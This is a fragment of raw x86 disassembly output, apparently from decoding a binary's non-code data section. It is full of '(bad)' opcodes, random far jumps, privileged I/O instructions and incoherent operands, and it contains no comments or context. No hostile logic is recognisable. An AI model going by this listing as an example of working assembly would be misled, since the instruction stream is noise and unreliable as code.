	...
  4225d7:	add    BYTE PTR [eax],al
  4225d9:	add    cl,cl
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    esp,DWORD PTR [edi-0x246f8045]
  4225eb:	mov    al,ds:0x1fd0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	pop    edi
  4225f3:	push   esi
  4225f4:	int    0xb4
  4225f6:	xchg   esi,eax
  4225f7:	push   edi
  4225f8:	pop    es
  4225f9:	mov    edx,0xcc7516a1
  4225fe:	ret    0x6183
  422601:	iretw  
  422603:	inc    ebx
  422604:	gs (bad) 
  422606:	cmc    
  422607:	adc    BYTE PTR [ecx+0xa],cl
  42260a:	inc    esi
  42260b:	adc    eax,0xc711f529
  422610:	mov    WORD PTR [esp+edi*4-0x19],?
  422614:	adc    edi,DWORD PTR [eax]
  422616:	std    
  422617:	jb     0x422665
  422619:	jge    0x422670
  42261b:	stos   BYTE PTR es:[edi],al
  42261c:	jo     0x422698
  42261e:	jmp    0x7ade:0xaa9ed8d7
  422625:	pop    esi
  422626:	ins    WORD PTR es:[edi],dx
  422628:	cmp    BYTE PTR [ebx-0x67],ch
  42262b:	test   BYTE PTR [ecx-0x20],dl
  42262e:	jne    0x4225f2
  422630:	push   cs
  422631:	into   
  422632:	add    cl,dh
  422634:	cli    
  422635:	out    0xe2,al
  422637:	push   0x3e
  422639:	pusha  
  42263a:	mov    ecx,0x43e38ac7
  42263f:	(bad)  
  422640:	dec    eax
  422641:	(bad)  
  422642:	adc    bh,cl
  422644:	pop    ebp
  422645:	mov    BYTE PTR [eax],0x17
  422648:	xor    BYTE PTR [ebp-0x78],0x25
  42264c:	retf   0x3452
  42264f:	push   esp
  422650:	rol    ecx,0x7
  422653:	xor    al,0x18
  422655:	sub    al,0x62
  422657:	pushf  
  422658:	xchg   edx,eax
  422659:	add    al,0xa9
  42265b:	iret   
  42265c:	or     bh,BYTE PTR [ecx-0x52]
  42265f:	leave  
  422660:	fisttp QWORD PTR [esi+0x79]
  422663:	xchg   ecx,eax
  422664:	mov    ds:0xf8dc88c1,eax
  422669:	scas   eax,DWORD PTR es:[edi]
  42266a:	cmp    BYTE PTR [ebp-0x7c],dl
  42266d:	outs   dx,BYTE PTR ds:[esi]
  42266e:	xchg   ebp,eax
  42266f:	push   edx
  422670:	clc    
  422671:	jnp    0x42260d
  422673:	clc    
  422674:	(bad)  
  422675:	std    
  422676:	push   ebp
  422677:	fldenv [ebx-0x43a4d10d]
  42267d:	lods   eax,DWORD PTR ds:[esi]
  42267e:	adc    al,0xec
  422680:	sbb    dl,al
  422682:	push   ss
  422683:	in     al,0x9e
  422685:	xlat   BYTE PTR ds:[ebx]
  422686:	sub    al,0xe
  422688:	jmp    0x10a:0x74e3bead
  42268f:	cmp    al,ch
  422691:	xor    eax,0x13896a4
  422696:	mov    edi,0x3affb565
  42269b:	pop    esp
  42269c:	push   esi
  42269d:	(bad)  
  42269f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226a0:	mov    DWORD PTR [edx+0x74],edx
  4226a3:	sub    BYTE PTR [ebx+0x2b],bh
  4226a6:	jbe    0x422670
  4226a8:	xor    ebp,DWORD PTR [esi-0x6f7e4d0d]
  4226ae:	ror    DWORD PTR [eax-0x10],1
  4226b1:	inc    BYTE PTR [edi]
  4226b3:	repz shl BYTE PTR [eax+0x6a],cl
  4226b7:	sahf   
  4226b8:	pop    eax
  4226b9:	xchg   DWORD PTR [edi-0xfd1ebef],edx
  4226bf:	shr    DWORD PTR [ecx+0x2f],cl
  4226c2:	call   0xdde4dd1a
  4226c7:	mov    esi,0x81527f24
  4226cc:	shl    BYTE PTR [edi*4+0x12f1aa5e],0xa6
  4226d4:	inc    esi
  4226d5:	call   0xca0f:0x37e7c2fd
  4226dc:	adc    al,0xa4
  4226de:	fldcw  WORD PTR [edx+0x5c]
  4226e1:	rol    DWORD PTR [edx+0x17],0xc0
  4226e5:	ja     0x4226e8
  4226e7:	jbe    0x422725
  4226e9:	mov    ecx,0xb8a9ce8d
  4226ee:	int3   
  4226ef:	inc    ecx
  4226f0:	cld    
  4226f1:	cmc    
  4226f2:	mov    bl,0x56
  4226f4:	arpl   WORD PTR [edx-0x3bb98522],di
  4226fa:	scas   eax,DWORD PTR es:[edi]
  4226fb:	inc    ecx
  4226fc:	out    0xf3,eax
  4226fe:	cmp    al,0x68
  422700:	dec    eax
  422701:	test   BYTE PTR [edx-0x37],bl
  422704:	(bad)  
  422705:	mov    ecx,0x42c128f
  42270a:	icebp  
  42270b:	call   0x22af:0x1281c124
  422712:	jne    0x422786
  422714:	mov    cl,0xc1
  422716:	out    dx,al
  422717:	repz into 
  422719:	test   al,0xaf
  42271b:	ds push edi
  42271d:	pop    esi
  42271e:	in     eax,0x66
  422720:	outs   dx,BYTE PTR ds:[esi]
  422721:	push   ebx
  422722:	mov    edx,0x557444b0
  422727:	xchg   ebx,eax
  422728:	inc    edi
  422729:	fwait
  42272a:	sbb    BYTE PTR [ecx+0x31945363],cl
  422730:	push   0x680e02f4
  422735:	out    dx,eax
  422736:	into   
  422737:	mov    cl,0x68
  422739:	sbb    eax,0xf8fe01b3
  42273e:	stc    
  42273f:	cs loope 0x4226c2
  422742:	pushf  
  422743:	call   0xe5658006
  422748:	dec    ebp
  422749:	pop    ebp
  42274a:	xchg   edi,eax
  42274b:	push   ebp
  42274c:	mov    eax,0xff9f177b
  422751:	dec    esp
  422752:	add    BYTE PTR [edi+0x722fa172],bl
  422758:	popa   
  422759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42275a:	jbe    0x42270c
  42275c:	jg     0x4226fd
  42275e:	push   ds
  42275f:	xchg   ebp,eax
  422760:	pushf  
  422761:	pusha  
  422762:	xor    al,0xb0
  422764:	pop    ebx
  422765:	pop    ebx
  422766:	sbb    ch,BYTE PTR [esp+esi*8+0x47]
  42276a:	mov    ch,0x8d
  42276c:	cdq    
  42276d:	mov    cl,0xdc
  42276f:	sbb    al,0x3a
  422771:	cs ret 
  422773:	repnz or bh,ch
  422776:	jno    0x42273d
  422778:	mov    DWORD PTR [esi],edi
  42277a:	jle    0x4227c0
  42277c:	sti    
  42277d:	adc    eax,0xe932f4df
  422782:	pop    ecx
  422783:	push   esp
  422784:	inc    esi
  422785:	mov    eax,0x6aa7d0e4
  42278a:	add    ch,cl
  42278c:	cld    
  42278d:	pcmpgtw mm3,QWORD PTR es:[edx+0x16]
  422792:	mov    DWORD PTR [ebx+0xfe2a11d],ecx
  422798:	push   esp
  422799:	je     0x4227ea
  42279b:	daa    
  42279c:	or     al,0x6a
  42279e:	inc    ecx
  42279f:	push   ecx
  4227a0:	inc    edx
  4227a1:	jmp    0xfd86:0x859cfe07
  4227a8:	fst    DWORD PTR [ecx+0x3a]
  4227ab:	sub    al,BYTE PTR [edi+ebx*8]
  4227ae:	ds xchg edx,eax
  4227b0:	rol    ebp,cl
  4227b2:	pop    esp
  4227b3:	xor    bh,BYTE PTR [edi-0x6c]
  4227b6:	lods   eax,DWORD PTR ds:[esi]
  4227b7:	ins    DWORD PTR es:[edi],dx
  4227b8:	pop    esp
  4227b9:	push   es
  4227ba:	ins    BYTE PTR es:[edi],dx
  4227bb:	lahf   
  4227bc:	enter  0xbd50,0x6a
  4227c0:	dec    edx
  4227c1:	dec    ebp
  4227c2:	popa   
  4227c3:	mov    eax,ds:0x9a5acd73
  4227c8:	xor    ch,dl
  4227ca:	data16 xor al,0x9c
  4227cd:	sub    bh,BYTE PTR [esi-0x5473e403]
  4227d3:	xor    BYTE PTR [edi],dl
  4227d5:	imul   edx,DWORD PTR [eax-0x1bd090a2],0xfcbdc0e
  4227df:	jg     0x4227cd
  4227e1:	das    
  4227e2:	or     bl,0xcf
  4227e5:	xchg   esp,eax
  4227e6:	inc    ebp
  4227e7:	adc    dh,ch
  4227e9:	push   ecx
  4227ea:	mov    DWORD PTR [ebx+0x2],esi
  4227ed:	push   ebx
  4227ee:	and    eax,DWORD PTR [eax]
	...
  4227f8:	add    BYTE PTR [eax],al
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0x43061df0],ebx
  422808:	rcl    BYTE PTR [ebx],cl
  42280a:	fsub   DWORD PTR [edx+0x1fd0001]
  422810:	add    BYTE PTR [eax],al
  422812:	xchg   ecx,eax
  422813:	xchg   edi,eax
  422814:	sahf   
  422815:	pop    edi
  422816:	xchg   ecx,eax
  422817:	mov    esp,0xa8795486
  42281c:	dec    eax
  42281d:	xor    eax,0xa2d412d
  422822:	repnz add ecx,edi
  422825:	push   ds
  422826:	js     0x422829
  422828:	xchg   esp,eax
  422829:	mov    edi,0x9b4e6e7c
  42282e:	loopne 0x42281f
  422830:	mov    bh,0x1d
  422832:	popa   
  422833:	lods   al,BYTE PTR ds:[esi]
  422834:	je     0x4227e1
  422836:	sar    BYTE PTR [ecx+ebx*4-0x891750a],0x14
  42283e:	mov    al,0xda
  422840:	add    esi,esi
  422842:	xor    ah,dh
  422844:	sbb    BYTE PTR [eax],al
  422846:	adc    DWORD PTR [ebx],esp
  422848:	dec    edi
  422849:	hlt    
  42284a:	shr    DWORD PTR [eax-0x6f22ce60],0x3
  422851:	mov    al,0x7e
  422853:	xlat   BYTE PTR ds:[ebx]
  422854:	or     edx,DWORD PTR [edx+0x77ab303a]
  42285a:	cli    
  42285b:	jo     0x4228af
  42285d:	(bad)  
  42285e:	shl    BYTE PTR [edi+0x2c44662a],cl
  422864:	dec    esi
  422865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422866:	enter  0xdad,0xc7
  42286a:	jo     0x422811
  42286c:	nop
  42286d:	sti    
  42286e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42286f:	(bad)  
  422870:	mov    dl,0x81
  422872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422873:	mov    al,BYTE PTR [ebx-0x56320116]
  422879:	sahf   
  42287a:	or     eax,0xa4950a7a
  42287f:	imul   edx,ebp,0x5f6fed0
  422885:	push   ecx
  422886:	stc    
  422887:	fs adc ebx,ebx
  42288a:	xchg   edi,ebp
  42288c:	fsubp  st(4),st
  42288e:	stos   DWORD PTR es:[edi],eax
  42288f:	sbb    ebx,edi
  422891:	jb     0x4228fc
  422893:	add    DWORD PTR [edi+edi*2],esp
  422896:	mov    BYTE PTR [ebx-0x3388c660],dl
  42289c:	es loop 0x422821
  42289f:	int    0x4a
  4228a1:	inc    edx
  4228a2:	in     eax,dx
  4228a3:	ror    BYTE PTR [ecx+ebx*4],0x72
  4228a7:	cmp    ebp,DWORD PTR [ecx+ebx*2]
  4228aa:	fwait
  4228ab:	in     eax,dx
  4228ac:	pop    edi
  4228ad:	and    BYTE PTR [edi],0x11
  4228b0:	ins    BYTE PTR es:[edi],dx
  4228b1:	mov    al,0x68
  4228b3:	dec    edx
  4228b4:	daa    
  4228b5:	(bad)  
  4228b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228b7:	and    BYTE PTR [ecx],ah
  4228b9:	retf   0xad5c
  4228bc:	cld    
  4228bd:	das    
  4228be:	std    
  4228bf:	sub    DWORD PTR [esi-0x37],esp
  4228c2:	loope  0x4228cd
  4228c4:	in     al,dx
  4228c5:	data16 mov ah,0x5c
  4228c8:	sahf   
  4228c9:	sub    dl,BYTE PTR [eax+ecx*8+0x1]
  4228cd:	test   BYTE PTR [eax+eax*4+0x43f31a29],dl
  4228d4:	retf   
  4228d5:	dec    ebx
  4228d6:	sahf   
  4228d7:	pop    esi
  4228d8:	sub    al,BYTE PTR [esp+edi*1-0x58dfea1c]
  4228df:	mov    cl,0xbc
  4228e1:	std    
  4228e2:	in     eax,dx
  4228e3:	out    0xac,eax
  4228e5:	(bad)  
  4228e7:	shl    DWORD PTR [esi+0x16955ac3],0x12
  4228ee:	and    BYTE PTR ds:0xa75b985c,bl
  4228f4:	push   esp
  4228f5:	xor    bh,BYTE PTR [eax]
  4228f7:	out    dx,al
  4228f8:	mov    ds:0x8d374adb,eax
  4228fd:	adc    edi,edx
  4228ff:	test   DWORD PTR [ebx],0x708a77cf
  422905:	stos   DWORD PTR es:[edi],eax
  422906:	dec    esp
  422907:	push   cs
  422908:	dec    edi
  422909:	inc    eax
  42290a:	frstor ds:0xdaa5c210
  422910:	scas   eax,DWORD PTR es:[edi]
  422911:	xor    DWORD PTR [esi],edi
  422913:	inc    ecx
  422914:	mov    ecx,0xa77b11e6
  422919:	dec    esi
  42291a:	pop    eax
  42291b:	fisub  DWORD PTR [eax]
  42291d:	cli    
  42291e:	xor    eax,0x2efb6008
  422923:	sub    BYTE PTR [ebx],ch
  422925:	std    
  422926:	dec    esp
  422927:	and    eax,0xa56f009f
  42292c:	int3   
  42292d:	ds push esp
  42292f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422930:	nop
  422931:	popa   
  422932:	dec    esi
  422933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422934:	xor    BYTE PTR [ecx-0x1c],ah
  422937:	test   eax,0x8cca7629
  42293c:	push   ebp
  42293d:	loop   0x4228fc
  42293f:	lods   eax,DWORD PTR ds:[esi]
  422940:	mov    ecx,DWORD PTR [esi+ecx*1-0x4e]
  422944:	mov    dl,0x37
  422946:	(bad)  
  422947:	pushf  
  422948:	cmp    BYTE PTR [edx-0x38a14d4f],bl
  42294e:	call   0xd304:0x8fa0a0a5
  422955:	jle    0x42296d
  422957:	push   edi
  422958:	push   0xf1d8b420
  42295d:	sbb    ch,BYTE PTR [edx]
  42295f:	sahf   
  422960:	shr    ecx,1
  422962:	mov    eax,0xf9270a80
  422967:	fist   DWORD PTR [eax-0x13414d0b]
  42296d:	lahf   
  42296e:	push   0xddf53b7b
  422973:	mov    ds:0xf255bf35,eax
  422978:	add    al,0xf0
  42297a:	hlt    
  42297b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42297c:	push   es
  42297d:	mov    eax,0x574fb27a
  422982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422983:	add    al,0xaf
  422985:	(bad)
  422988:	xchg   ebx,eax
  422989:	repz sbb BYTE PTR [eax],ah
  42298c:	jo     0x4229ec
  42298e:	ja     0x422978
  422990:	scas   eax,DWORD PTR es:[edi]
  422991:	push   ebp
  422992:	push   esp
  422993:	adc    bh,cl
  422995:	inc    edx
  422996:	cdq    
  422997:	scas   al,BYTE PTR es:[edi]
  422998:	arpl   WORD PTR [eax],bx
  42299a:	or     al,0x4a
  42299c:	jb     0x4229a5
  42299e:	fs stc 
  4229a0:	ins    BYTE PTR es:[edi],dx
  4229a1:	push   esi
  4229a2:	mov    bl,0xc8
  4229a4:	push   esp
  4229a5:	in     eax,0x1b
  4229a7:	scas   al,BYTE PTR es:[edi]
  4229a8:	mov    dl,BYTE PTR [eax-0x73]
  4229ab:	jno    0x4229d7
  4229ad:	cmp    al,0x4a
  4229af:	push   eax
  4229b0:	adc    ah,BYTE PTR [eax]
  4229b2:	scas   al,BYTE PTR es:[edi]
  4229b3:	lds    esp,FWORD PTR [edx+0x7773e91d]
  4229b9:	add    DWORD PTR [ebx],esi
  4229bb:	fidivr DWORD PTR [edi+0x6efdbbc7]
  4229c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229c2:	jp     0x4229c9
  4229c4:	and    DWORD PTR [eax-0xc],ebp
  4229c7:	push   0x4c
  4229c9:	pop    ds
  4229ca:	adc    eax,0x53839f80
  4229cf:	xchg   ebx,eax
  4229d0:	add    al,0xaf
  4229d2:	cwde   
  4229d3:	sub    ah,dl
  4229d5:	in     eax,0x38
  4229d7:	outs   dx,BYTE PTR ds:[esi]
  4229d8:	mov    bl,0x9c
  4229da:	push   ebx
  4229db:	add    BYTE PTR [ebp+0x3e],ch
  4229de:	push   esp
  4229df:	fnstenv [edx+0x56]
  4229e2:	sti    
  4229e3:	jecxz  0x4229bf
  4229e5:	ret    
  4229e6:	in     eax,0xb9
  4229e8:	mov    dh,0x4
  4229ea:	cs in  eax,dx
  4229ec:	and    bl,BYTE PTR [ebx+0x7f]
  4229ef:	sbb    ebp,DWORD PTR [ecx]
  4229f1:	dec    ecx
  4229f2:	inc    edi
  4229f3:	adc    al,0x28
  4229f5:	push   esp
  4229f6:	mov    dh,0xb7
  4229f8:	arpl   ax,bp
  4229fa:	outs   dx,DWORD PTR ds:[esi]
  4229fb:	jecxz  0x422a57
  4229fd:	jne    0x422a00
  4229ff:	cli    
  422a00:	xchg   DWORD PTR [edx-0x32],edx
  422a03:	mov    edi,0x63077294
  422a08:	sbb    esp,DWORD PTR [edi+0x5d]
  422a0b:	sti    
  422a0c:	jne    0x422a4a
  422a0e:	and    eax,0x0
  422a13:	add    BYTE PTR [eax],al
  422a15:	add    BYTE PTR [eax],al
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	cmc    
  422a27:	xchg   BYTE PTR [ebp+0x1a4d5d0],al
  422a2d:	add    ch,bh
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    bl,ah
  422a33:	xor    al,0xdd
  422a35:	fwait
  422a36:	xor    al,BYTE PTR [esi+esi*8+0x7d2fa7ff]
  422a3d:	dec    edx
  422a3e:	push   edi
  422a3f:	call   0x9f34538b
  422a44:	push   ecx
  422a45:	push   edx
  422a46:	or     bh,BYTE PTR [edi+ebp*8+0x1b864abd]
  422a4d:	or     DWORD PTR [edi+0x18],0x3a
  422a51:	push   ebp
  422a52:	mov    edi,0xc9d2f265
  422a57:	xor    eax,0xcf3e6549
  422a5c:	jnp    0x422ab5
  422a5e:	pop    edi
  422a5f:	popf   
  422a60:	xchg   ebp,eax
  422a61:	imul   esi,DWORD PTR [ebp-0x2b35b5cb],0xffffffcc
  422a68:	cmp    al,0x5e
  422a6a:	adc    eax,0xc14820e5
  422a6f:	enter  0xaada,0x40
  422a73:	out    dx,eax
  422a74:	or     BYTE PTR ds:0x7a25ca8c,ah
  422a7a:	and    ecx,DWORD PTR [edi+0x52cf4c59]
  422a80:	pop    edx
  422a81:	xor    edi,DWORD PTR ds:0x62966715
  422a87:	push   edx
  422a88:	jecxz  0x422a88
  422a8a:	pop    ss
  422a8b:	adc    cl,BYTE PTR [ecx-0x1a]
  422a8e:	mov    esi,0xdf460677
  422a93:	mov    ah,0x7b
  422a95:	gs aam 0xf5
  422a98:	idiv   BYTE PTR [ecx]
  422a9a:	icebp  
  422a9b:	pop    ecx
  422a9c:	shl    DWORD PTR [esi],1
  422a9e:	or     eax,0xd70569bd
  422aa3:	test   bh,al
  422aa5:	into   
  422aa6:	xor    bh,ch
  422aa8:	dec    edi
  422aa9:	jns    0x422aba
  422aab:	call   0x5275:0xde7dcb7a
  422ab2:	or     DWORD PTR [eax],edi
  422ab4:	xor    al,BYTE PTR [eax]
  422ab6:	arpl   bp,ax
  422ab8:	ja     0x422b2b
  422aba:	in     eax,dx
  422abb:	mov    eax,ds:0xb12cd3e9
  422ac0:	pusha  
  422ac1:	fnsave ss:[eax-0x5599f542]
  422ac8:	adc    al,0x5
  422aca:	aas    
  422acb:	mov    WORD PTR [edx+eiz*2-0x18f36022],?
  422ad2:	push   ecx
  422ad3:	enter  0xcc27,0x7d
  422ad7:	sub    ecx,DWORD PTR [eax]
  422ad9:	sub    DWORD PTR [eax],edx
  422adb:	add    BYTE PTR [ecx-0x11],dl
  422ade:	push   edx
  422adf:	mov    fs:0x75366f8f,al
  422ae5:	jl     0x422a97
  422ae7:	neg    DWORD PTR [ecx]
  422ae9:	jmp    0x800a:0xb96d4a3b
  422af0:	push   esp
  422af1:	cmp    eax,0x25173516
  422af6:	and    ch,BYTE PTR [edx+edi*4]
  422af9:	xor    esp,DWORD PTR [ecx+eax*4-0x43]
  422afd:	xor    DWORD PTR [edi+0x67],0xffffffa4
  422b01:	and    dl,BYTE PTR [ecx-0x1dd8be48]
  422b07:	daa    
  422b08:	and    ebp,0xffffffd0
  422b0b:	mov    esp,0xdb3c4e38
  422b10:	push   ebp
  422b11:	outs   dx,DWORD PTR ds:[esi]
  422b12:	popf   
  422b13:	mov    ds:0x633f646b,al
  422b18:	mov    al,ds:0x399a1628
  422b1d:	rcl    DWORD PTR [eax-0x6c9ba97a],1
  422b23:	xor    eax,0x52921afd
  422b28:	repz mov WORD PTR [edi-0x6985d403],ds
  422b2f:	(bad)  
  422b30:	pop    eax
  422b31:	jb     0x422ab3
  422b33:	cwde   
  422b34:	xor    ch,bl
  422b36:	push   ebp
  422b37:	jo     0x422b3a
  422b39:	ret    0x575d
  422b3c:	pop    es
  422b3d:	aas    
  422b3e:	ficom  WORD PTR ds:[edi+0x365d0247]
  422b45:	outs   dx,DWORD PTR ds:[esi]
  422b46:	fwait
  422b47:	cmp    DWORD PTR [esi],0xcdcf7bd6
  422b4d:	jnp    0x422b8a
  422b4f:	add    eax,esi
  422b51:	int3   
  422b52:	fmul   st(7),st
  422b54:	pop    dx
  422b56:	add    eax,0x95a05f3e
  422b5b:	popf   
  422b5c:	cwde   
  422b5d:	int    0xc
  422b5f:	adc    ebp,DWORD PTR ds:0x450b765c
  422b65:	rcr    edi,cl
  422b67:	les    esp,FWORD PTR [ebx-0x3cb7ed3e]
  422b6d:	cmp    BYTE PTR [esi],0x7b
  422b70:	or     dl,ch
  422b72:	pop    ds
  422b73:	mov    edx,0x1f49de2f
  422b78:	add    ah,BYTE PTR [edx-0x59b55d87]
  422b7e:	(bad)  
  422b80:	rcl    BYTE PTR [eax-0xe],1
  422b83:	jg     0x422b66
  422b85:	cli    
  422b86:	ror    DWORD PTR [ecx],1
  422b88:	xor    eax,0xd97f3d5f
  422b8d:	mov    ebp,0xc11199f3
  422b92:	out    dx,eax
  422b93:	sar    DWORD PTR [esi+0x54],0xc9
  422b97:	mov    al,ds:0xb4d0b818
  422b9c:	jno    0x422b5b
  422b9e:	add    BYTE PTR [ecx],al
  422ba0:	mov    dl,0x5e
  422ba2:	mov    bh,0x92
  422ba4:	stc    
  422ba5:	jle    0x422c14
  422ba7:	xor    cl,BYTE PTR [ecx+0x95b126f]
  422bad:	rcl    DWORD PTR [edi-0x23],1
  422bb0:	and    eax,0x8fcab452
  422bb5:	(bad)  
  422bb6:	fidivr DWORD PTR [esi]
  422bb8:	pop    esi
  422bb9:	popf   
  422bba:	sbb    DWORD PTR ds:0x78003027,0xffffffbc
  422bc1:	daa    
  422bc2:	ins    BYTE PTR es:[edi],dx
  422bc3:	sub    DWORD PTR [ecx-0x7350bca2],0xbc21569b
  422bcd:	mov    ah,0x52
  422bcf:	mov    esp,0x9dee4bc4
  422bd4:	aam    0x6
  422bd6:	mov    dh,0xd3
  422bd8:	mov    dh,0x2
  422bda:	mov    ah,0xef
  422bdc:	and    DWORD PTR [ecx-0x37],ebx
  422bdf:	lods   al,BYTE PTR ds:[esi]
  422be0:	sar    BYTE PTR [edx+ebx*4+0x2e151f5c],0x9d
  422be8:	xchg   edx,eax
  422be9:	dec    BYTE PTR [esi]
  422beb:	sbb    BYTE PTR [ebx+0x52],0x60
  422bef:	fwait
  422bf0:	add    DWORD PTR [esi],ebp
  422bf2:	test   al,0x6e
  422bf4:	repz aad 0x47
  422bf7:	stos   BYTE PTR es:[edi],al
  422bf8:	and    al,dl
  422bfa:	scas   eax,DWORD PTR es:[edi]
  422bfb:	pop    ss
  422bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bfd:	adc    al,0xa6
  422bff:	sahf   
  422c00:	xor    cl,BYTE PTR [ecx]
  422c02:	pop    es
  422c03:	push   0xcd08e641
  422c08:	test   eax,0x245d9076
  422c0d:	cmc    
  422c0e:	in     eax,0xe3
  422c10:	mov    edi,0xddfff98e
  422c15:	inc    edx
  422c16:	add    esi,DWORD PTR [eax+edx*4]
  422c19:	and    ecx,edx
  422c1b:	dec    BYTE PTR [esi-0x1585e4ef]
  422c21:	gs jno 0x422bfb
  422c24:	cli    
  422c25:	xchg   esi,eax
  422c26:	mov    edi,0x53b5fed8
  422c2b:	pushf  
  422c2c:	ds in  eax,dx
  422c2e:	inc    BYTE PTR [eax]
	...
  422c38:	add    BYTE PTR [eax],al
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    esi,DWORD PTR [ebx-0x2db252d3]
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	std    
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    BYTE PTR [edi+eiz*2-0x6c],dh
  422c55:	cmp    ebx,DWORD PTR [ecx+0x2b7d6891]
  422c5b:	mov    ch,al
  422c5d:	nop
  422c5e:	mov    edx,0x3467e86a
  422c63:	cmp    al,0x4a
  422c65:	sub    DWORD PTR [edi-0x7],esi
  422c68:	mov    edi,0x664fed14
  422c6d:	pop    eax
  422c6e:	mov    ah,0x2b
  422c70:	fisub  WORD PTR [esi-0x4398cf2e]
  422c76:	xchg   DWORD PTR [edi+0x28],esi
  422c79:	sbb    al,0x58
  422c7b:	push   cs
  422c7c:	add    BYTE PTR [esp+ebp*8-0x2ee1ec65],0x84
  422c84:	rcl    esp,cl
  422c86:	aaa    
  422c87:	in     eax,dx
  422c88:	rcr    ebx,0xfa
  422c8b:	pusha  
  422c8c:	arpl   WORD PTR [edi+ecx*2-0x5439636f],ax
  422c93:	lock pop ecx
  422c95:	in     eax,dx
  422c96:	push   ds
  422c97:	bnd jmp 0x43f36681
  422c9d:	pop    es
  422c9e:	shr    DWORD PTR [eax-0x5f],1
  422ca1:	daa    
  422ca2:	mov    bh,0x2
  422ca4:	nop
  422ca5:	aam    0x28
  422ca7:	sar    DWORD PTR [ecx-0x49],1
  422caa:	mov    ch,0xb
  422cac:	lds    edi,FWORD PTR [edx+0x503cdc14]
  422cb2:	sub    bl,BYTE PTR ds:0xf5eaed6d
  422cb8:	adc    BYTE PTR [esi+0x75],dl
  422cbb:	call   0xa875af5a
  422cc0:	push   esp
  422cc1:	jns    0x422d09
  422cc3:	sbb    cl,BYTE PTR [edx-0x7]
  422cc6:	jg     0x422d16
  422cc8:	push   ecx
  422cc9:	aad    0x3c
  422ccb:	jge    0x422c5c
  422ccd:	jl     0x422d4c
  422ccf:	sbb    edi,DWORD PTR [edi]
  422cd1:	or     BYTE PTR [edi],cl
  422cd3:	and    eax,0xb4d2416c
  422cd8:	inc    esp
  422cd9:	ins    BYTE PTR es:[edi],dx
  422cda:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  422cdc:	add    ecx,DWORD PTR [edi+eax*4+0x450e0ee5]
  422ce3:	je     0x422c6f
  422ce5:	cli    
  422ce6:	imul   ecx,DWORD PTR [ebx-0xd],0xffffffe2
  422cea:	dec    eax
  422ceb:	lods   eax,DWORD PTR ds:[esi]
  422cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ced:	fsubr  st,st(6)
  422cef:	push   edi
  422cf0:	pop    ebp
  422cf1:	push   0xfffffffc
  422cf3:	enter  0x4af5,0x96
  422cf7:	jmp    DWORD PTR [esi-0x623e2db6]
  422cfd:	pop    esp
  422cfe:	aaa    
  422cff:	stos   DWORD PTR es:[edi],eax
  422d00:	icebp  
  422d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d02:	cmp    bl,BYTE PTR [ecx+0x4de0b315]
  422d08:	cwde   
  422d09:	fst    DWORD PTR [eax]
  422d0b:	ret    
  422d0c:	pop    ebp
  422d0d:	adc    al,BYTE PTR [ebx+0x2ad57ccd]
  422d13:	jle    0x422d68
  422d15:	jae    0x422d5c
  422d17:	(bad)  
  422d18:	dec    edi
  422d19:	push   edx
  422d1a:	mov    BYTE PTR [esi+0x5ece00a1],bl
  422d20:	scas   al,BYTE PTR es:[edi]
  422d21:	jbe    0x422d6c
  422d23:	dec    edi
  422d24:	cmp    al,0x1a
  422d26:	pop    ss
  422d27:	outs   dx,BYTE PTR ds:[esi]
  422d28:	stc    
  422d29:	xchg   esp,eax
  422d2a:	repnz or dh,BYTE PTR cs:[eax+0x74]
  422d2f:	ret    
  422d30:	in     al,0xea
  422d32:	icebp  
  422d33:	or     BYTE PTR [edi-0x51],0x46
  422d37:	daa    
  422d38:	imul   eax,edx,0xffffff88
  422d3b:	sbb    DWORD PTR [ebp-0x4c7af6cf],edx
  422d41:	xchg   ebp,eax
  422d42:	pop    edx
  422d43:	(bad)  [esi+0x3355be91]
  422d49:	adc    cl,ch
  422d4b:	aas    
  422d4c:	push   es
  422d4d:	(bad)  
  422d4e:	aaa    
  422d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d50:	aaa    
  422d51:	adc    DWORD PTR [ebx-0x4d2e7512],esp
  422d57:	call   0x679b:0xf9e71608
  422d5e:	cwde   
  422d5f:	mov    WORD PTR [edx],?
  422d61:	pop    edx
  422d62:	and    BYTE PTR [esi+0x5d],0x61
  422d66:	pop    esp
  422d67:	xchg   edi,eax
  422d68:	xlat   BYTE PTR ds:[ebx]
  422d69:	or     eax,0x7dbfe4ea
  422d6e:	pop    edi
  422d6f:	mov    DWORD PTR [edx+ecx*8-0x20e0a686],esi
  422d76:	cld    
  422d77:	push   esp
  422d78:	pusha  
  422d79:	shr    BYTE PTR [edi-0x30db6e11],1
